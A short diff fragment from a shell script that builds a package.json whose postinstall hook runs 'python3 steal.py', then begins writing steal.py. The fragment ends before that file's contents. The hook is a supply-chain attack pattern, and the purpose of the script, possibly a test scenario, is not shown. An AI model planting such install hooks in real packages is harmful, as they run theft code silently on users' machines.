@@ -20,3 +20,7 @@ cat > package.json << 'EOF'
   "scripts": {
     "postinstall": "python3 steal.py"
   }
+}
+EOF
+
+cat > steal.py << 'EOF'
